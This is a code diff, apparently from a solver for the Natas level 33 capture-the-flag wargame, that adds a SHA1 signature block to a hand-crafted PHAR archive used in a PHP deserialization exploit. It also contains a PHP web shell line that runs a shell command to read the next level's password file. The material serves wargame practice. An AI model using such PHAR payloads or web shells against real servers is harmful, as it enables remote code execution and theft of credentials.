@@ -2,6 +2,7 @@ import re
 import struct
 import time
 import zlib
+import hashlib          # <- nuevo
 
 from src.natas.base_level import NatasLevel
 
@@ -45,14 +46,20 @@ class Level_33(NatasLevel):
     file_entry += struct.pack("<I", 0)
     file_entry += struct.pack("<I", 0)
 
+    GLOBAL_FLAGS = 0x00010000  # SIG_FLAG: indica que el phar trae firma al final
+
     manifest  = struct.pack("<I", 1)
     manifest += b"\x11\x00"
-    manifest += struct.pack("<I", 0)
+    manifest += struct.pack("<I", GLOBAL_FLAGS)   # <- antes era 0
     manifest += struct.pack("<I", 0)
     manifest += struct.pack("<I", len(metadata)) + metadata
     manifest += file_entry
 
-    phar = stub + struct.pack("<I", len(manifest)) + manifest + content
+    phar_body = stub + struct.pack("<I", len(manifest)) + manifest + content
+
+    # Bloque de firma: hash del contenido + flag de algoritmo (SHA1=0x0002) + magic "GBMB"
+    signature = hashlib.sha1(phar_body).digest()
+    phar = phar_body + signature + struct.pack("<I", 0x0002) + b"GBMB"
 
     shell = b'<?php echo shell_exec("cat /etc/natas_webpass/natas34"); ?>'
 
